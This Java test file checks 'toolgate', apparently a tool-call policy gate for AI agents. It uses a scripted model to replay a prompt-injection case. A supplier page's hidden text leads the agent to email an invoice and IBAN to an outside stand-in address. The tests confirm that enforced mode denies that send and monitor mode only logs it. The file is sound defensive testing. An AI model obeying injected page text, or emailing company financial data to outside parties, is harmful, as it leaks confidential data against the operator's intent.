package io.toolgate.demo;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.tuple;
import static org.awaitility.Awaitility.await;

import io.toolgate.api.Decision;
import io.toolgate.api.Mode;
import io.toolgate.api.policy.BuiltInRules;
import io.toolgate.demo.MockModelServer.Call;
import io.toolgate.spi.AuditEvent;
import io.toolgate.spi.AuditSink;
import java.io.IOException;
import java.io.UncheckedIOException;
import java.time.Duration;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.context.TestConfiguration;
import org.springframework.context.annotation.Bean;
import org.springframework.test.context.DynamicPropertyRegistry;
import org.springframework.test.context.DynamicPropertySource;

/**
 * M2's exit check: the demo's injected email is denied end to end against a scripted model, and monitor
 * mode logs the same decision without blocking. The model makes Case A's calls exactly as a model that
 * obeyed the supplier page's hidden text would.
 */
class CaseAEndToEndTest {

    private static final MockModelServer MODEL = start();
    private static final List<AuditEvent> AUDIT = new CopyOnWriteArrayList<>();
    private static final String OUTSIDE = "remit@acme-payments.example";
    private static final String BILLING = "billing@mycompany.com";

    @AfterAll
    static void stop() {
        MODEL.close();
    }

    static void model(DynamicPropertyRegistry registry) {
        registry.add("spring.ai.openai.base-url", MODEL::baseUrl);
        registry.add("spring.ai.openai.api-key", () -> "test");
    }

    /** Collects audit events; the {@code toolgate.audit} log gets them too. */
    @TestConfiguration
    static class Audit {

        @Bean
        AuditSink collectingAuditSink() {
            return AUDIT::add;
        }
    }

    /** Case A's four calls, then the model's final answer. */
    static void scriptTheAttack() {
        MODEL.reset();
        AUDIT.clear();
        MODEL.thenToolCalls(new Call("call_1", "readInvoice", "{\"id\":\"INV-118\"}"))
                .thenToolCalls(new Call("call_2", "fetchSupplierPage", "{\"url\":\"https://acme.suppliers.example/terms\"}"))
                .thenToolCalls(new Call("call_3", "sendEmail", "{\"to\":\"" + OUTSIDE + "\",\"body\":\"invoice and IBAN\"}"))
                .thenToolCalls(new Call("call_4", "sendEmail", "{\"to\":\"" + BILLING + "\",\"body\":\"invoice and IBAN\"}"))
                .thenText("Invoice INV-118 processed.");
    }

    @Nested
    @SpringBootTest(classes = {DemoApplication.class, Audit.class})
    class Enforced {

        @Autowired
        private InvoiceJob job;
        @Autowired
        private Mailbox mailbox;

        @DynamicPropertySource
        static void properties(DynamicPropertyRegistry registry) {
            model(registry);
        }

        @BeforeEach
        void attack() {
            mailbox.clear();
            scriptTheAttack();
        }

        @Test
        void theOutsideRecipientIsDeniedAndTheSendBecomesADraft() {
            assertThat(job.process("INV-118")).isEqualTo("Invoice INV-118 processed.");

            assertThat(mailbox.sent()).as("nothing left the company").isEmpty();
            assertThat(mailbox.drafts()).as("row 4: a draft for a reviewer").containsExactly(BILLING);
            assertThat(MODEL.requests().get(3)).as("the model only learns it was not permitted")
                    .contains(Decision.Deny.MODEL_MESSAGE).doesNotContain("sendEmail.to");
            await().atMost(Duration.ofSeconds(5)).untilAsserted(() -> assertThat(AUDIT)
                    .filteredOn(AuditEvent.Decided.class::isInstance).hasSize(4));
            List<AuditEvent.Decided> decisions = AUDIT.stream().filter(AuditEvent.Decided.class::isInstance)
                    .map(AuditEvent.Decided.class::cast).toList();
            assertThat(decisions).extracting(decided -> decided.applied().getClass().getSimpleName(),
                            decided -> decided.applied().ruleId())
                    .containsExactly(
                            tuple("Allow", BuiltInRules.ALLOW_LIST),
                            tuple("Allow", BuiltInRules.ALLOW_LIST),
                            tuple("Deny", "sendEmail.to"),
                            tuple("Downgrade", BuiltInRules.TAINT_TRIFECTA));
        }
    }

    @Nested
    @SpringBootTest(classes = {DemoApplication.class, Audit.class}, properties = "demo.toolgate.mode=monitor")
    class Monitored {

        @Autowired
        private InvoiceJob job;
        @Autowired
        private Mailbox mailbox;

        @DynamicPropertySource
        static void properties(DynamicPropertyRegistry registry) {
            model(registry);
        }

        @BeforeEach
        void attack() {
            mailbox.clear();
            scriptTheAttack();
        }

        @Test
        void nothingIsBlockedButTheSameDenialIsLogged() {
            job.process("INV-118");

            assertThat(mailbox.sent()).as("monitor mode never blocks").containsExactly(OUTSIDE, BILLING);
            await().atMost(Duration.ofSeconds(5)).untilAsserted(() -> assertThat(AUDIT)
                    .filteredOn(AuditEvent.Decided.class::isInstance).hasSize(4));
            AuditEvent.Decided third = AUDIT.stream().filter(AuditEvent.Decided.class::isInstance)
                    .map(AuditEvent.Decided.class::cast).toList().get(2);
            assertThat(third.mode()).isEqualTo(Mode.MONITOR);
            assertThat(third.applied()).isInstanceOf(Decision.Allow.class);
            assertThat(third.computed()).isInstanceOfSatisfying(Decision.Deny.class,
                    deny -> assertThat(deny.ruleId()).isEqualTo("sendEmail.to"));
        }
    }

    private static MockModelServer start() {
        try {
            return new MockModelServer();
        } catch (IOException failed) {
            throw new UncheckedIOException(failed);
        }
    }
}
